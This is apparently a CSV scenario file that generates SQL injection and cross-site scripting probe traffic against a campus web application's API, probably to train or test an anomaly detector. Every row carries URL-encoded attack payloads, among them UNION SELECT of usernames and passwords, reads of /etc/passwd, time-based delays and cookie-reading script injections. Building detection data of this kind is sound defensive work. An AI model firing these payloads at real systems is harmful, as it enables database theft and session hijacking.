scenario_id,category,intent_class,email,password,search_keyword,secondary_search_keyword,post_title,post_content,probe_path,ua
S001,sqli,attack,student1@campus.local,Password123!,%27+OR+1%3D1--,%27+UNION+SELECT+NULL--,SQLi probe alpha,SQLi payload OR 1=1 against board search and write path,/api/public/announcements?keyword=%27+OR+1%3D1--,sqlmap/1.8
S002,sqli,attack,student2@campus.local,Password123!,%27+UNION+SELECT+NULL--,%27+UNION+SELECT+username%2Cpassword+FROM+users--,SQLi probe beta,Union select style probe aimed at announcement and board search,/api/public/academic-events?q=%27+UNION+SELECT+NULL--,curl/8.6
S003,sqli,attack,student3@campus.local,Password123!,%27+OR+%271%27%3D%271,%27+OR+SLEEP(5)%23,SQLi probe gamma,Boolean based SQLi probe staged through normal looking requests,/api/board/posts?keyword=%27+OR+%271%27%3D%271,python-requests/2.32
S004,sqli,attack,student4@campus.local,Password123!,1%27+AND+1%3D1--,1%27+AND+1%3D2--,SQLi probe delta,Differential SQLi probe comparing true and false conditions,/api/public/announcements?keyword=1%27+AND+1%3D1--,Mozilla/5.0
S005,sqli,attack,student5@campus.local,Password123!,admin%27%23,%27)+OR+(%271%27%3D%271,SQLi probe epsilon,Hash comment and bracketed SQLi patterns mixed into browsing flow,/api/public/academic-events?q=admin%27%23,Wget/1.21.4
S006,sqli,attack,student1@campus.local,Password123!,%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--,%27+OR+BENCHMARK(1000000%2CSHA1(1))%23,SQLi probe zeta,Time based SQLi strings used to stretch anomaly scoring,/api/board/posts?keyword=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--,Go-http-client/1.1
S007,sqli,attack,student2@campus.local,Password123!,%27+UNION+SELECT+table_name+FROM+information_schema.tables--,%27+UNION+SELECT+schema_name+FROM+information_schema.schemata--,SQLi probe eta,Metadata enumeration payloads reused across board and public reads,/api/public/announcements?keyword=%27+UNION+SELECT+table_name+FROM+information_schema.tables--,sqlmap/1.8
S008,sqli,attack,student3@campus.local,Password123!,%27+OR+1%3D1%23,%27+OR+SLEEP(5)--,SQLi probe theta,MySQL style comments and delay payloads inside student session traffic,/api/public/academic-events?q=%27+OR+1%3D1%23,curl/8.6
S009,sqli,attack,student4@campus.local,Password123!,1%27+ORDER+BY+5--,1%27+GROUP+BY+1%2C2%2C3--,SQLi probe iota,Ordering and grouping probes folded into search endpoints,/api/board/posts?keyword=1%27+ORDER+BY+5--,python-requests/2.32
S010,sqli,attack,student5@campus.local,Password123!,%27+UNION+SELECT+load_file(%27%2Fetc%2Fpasswd%27)--,%27+UNION+SELECT+@@version--,SQLi probe kappa,File read and version discovery payloads used in sequence,/api/public/announcements?keyword=%27+UNION+SELECT+@@version--,Mozilla/5.0
S011,sqli,attack,student1@campus.local,Password123!,%27+OR+exists(select+1+from+users)--,%27+OR+substring(database()%2C1%2C1)%3D%27c%27--,SQLi probe lambda,Existence and substring checks blended into low volume reads,/api/public/academic-events?q=%27+OR+exists(select+1+from+users)--,sqlmap/1.8
S012,sqli,attack,student2@campus.local,Password123!,1%27+UNION+SELECT+NULL%2CNULL--,%27+AND+updatexml(1%2Cconcat(0x7e%2Cuser())%2C1)--,SQLi probe mu,Error based SQLi strings carried through search and probe requests,/api/board/posts?keyword=%27+AND+updatexml(1%2Cconcat(0x7e%2Cuser())%2C1)--,libwww-perl/6.77
S013,xss,attack,student3@campus.local,Password123!,%3Cscript%3Ealert(1)%3C%2Fscript%3E,%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,XSS probe alpha,XSS script tag payload written after reflective search attempt,/api/public/announcements?keyword=%3Cscript%3Ealert(1)%3C%2Fscript%3E,Mozilla/5.0
S014,xss,attack,student4@campus.local,Password123!,%3Csvg%2Fonload%3Dalert(1)%3E,%3Ciframe+src%3Djavascript%3Aalert(1)%3E,XSS probe beta,SVG and iframe payloads reused across browsing and board write,/api/public/academic-events?q=%3Csvg%2Fonload%3Dalert(1)%3E,curl/8.6
S015,xss,attack,student5@campus.local,Password123!,%3Cbody+onload%3Dalert(document.domain)%3E,%3Ca+href%3Djavascript%3Aalert(1)%3Eclick%3C%2Fa%3E,XSS probe gamma,DOM event XSS probes wrapped in normal student activity,/api/board/posts?keyword=%3Cbody+onload%3Dalert(document.domain)%3E,python-requests/2.32
S016,xss,attack,student1@campus.local,Password123!,%3Cdetails+open+ontoggle%3Dalert(1)%3E,%3Cmarquee+onstart%3Dalert(1)%3Etest%3C%2Fmarquee%3E,XSS probe delta,Less common HTML event payloads used for rule diversity,/api/public/announcements?keyword=%3Cdetails+open+ontoggle%3Dalert(1)%3E,Go-http-client/1.1
S017,xss,attack,student2@campus.local,Password123!,%22%3E%3Cscript%3Econfirm(1)%3C%2Fscript%3E,%3Cvideo%3E%3Csource+onerror%3Dalert(1)%3E%3C%2Fvideo%3E,XSS probe epsilon,Broken attribute and media source payloads chained together,/api/public/academic-events?q=%22%3E%3Cscript%3Econfirm(1)%3C%2Fscript%3E,Wget/1.21.4
S018,xss,attack,student3@campus.local,Password123!,%3Cmath%3E%3Cmtext%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E,%3Cobject+data%3Djavascript%3Aalert(1)%3E,XSS probe zeta,Markup heavy XSS patterns included for parser stress,/api/board/posts?keyword=%3Cmath%3E%3Cmtext%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E,libwww-perl/6.77
S019,xss,attack,student4@campus.local,Password123!,%3Cimg+src%3D1+onerror%3Dprompt(1)%3E,%3Csvg%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C%2Fsvg%3E,XSS probe eta,Prompt and nested SVG script payloads ride on board searches,/api/public/announcements?keyword=%3Cimg+src%3D1+onerror%3Dprompt(1)%3E,curl/8.6
S020,xss,attack,student5@campus.local,Password123!,%3Cform%3E%3Cbutton+formaction%3Djavascript%3Aalert(1)%3E,%3Cinput+autofocus+onfocus%3Dalert(1)%3E,XSS probe theta,Form and autofocus handlers increase XSS family coverage,/api/public/academic-events?q=%3Cinput+autofocus+onfocus%3Dalert(1)%3E,Mozilla/5.0
S021,xss,attack,student1@campus.local,Password123!,%3Cscript%3Efetch('/steal')%3C%2Fscript%3E,%3Cimg+src%3Dxx+onerror%3Dconfirm(document.cookie)%3E,XSS probe iota,Exfiltration flavored script strings appear in two channels,/api/board/posts?keyword=%3Cscript%3Efetch('/steal')%3C%2Fscript%3E,python-requests/2.32
S022,xss,attack,student2@campus.local,Password123!,%3Csvg%2Fonload%3DsetTimeout(alert%2C1)%3E,%3Cstyle%3Ebody%7Bbackground:url(javascript:alert(1))%7D%3C%2Fstyle%3E,XSS probe kappa,Timer and style based XSS variants close the training set,/api/public/announcements?keyword=%3Csvg%2Fonload%3DsetTimeout(alert%2C1)%3E,Go-http-client/1.1
